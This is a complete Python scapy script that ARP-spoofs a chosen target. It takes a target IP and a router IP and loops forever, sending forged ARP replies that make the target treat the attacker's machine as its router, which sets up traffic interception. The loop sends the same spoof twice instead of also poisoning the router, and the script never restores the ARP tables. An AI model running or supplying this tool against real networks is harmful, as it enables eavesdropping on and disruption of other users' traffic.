import scapy.all as scapy
import optparse
import time

def getArgs():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--targetIP", dest="targetIp", help="include target ip")
    parser.add_option("-r", "--routerIP", dest="routerIp", help="include router ip")
    (opt, arg) = parser.parse_args()
    if not opt.targetIp:
        parser.error("[-] Please specify an targetIp. Use --help for information.")
    elif not opt.routerIp:
        parser.error("[-] Please specify routerIp. Use --help for information.")

    return opt
def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest
    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
    return answeredList[0][1].hwsrc


def spoof(targetIp, spoofIp):
    targetMac = getMac(targetIp)
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
    scapy.send(packet)

opt = getArgs()

while True:
    spoof(opt.targetIp, opt.routerIp)
    spoof(opt.targetIp, opt.routerIp)
    time.sleep(2)
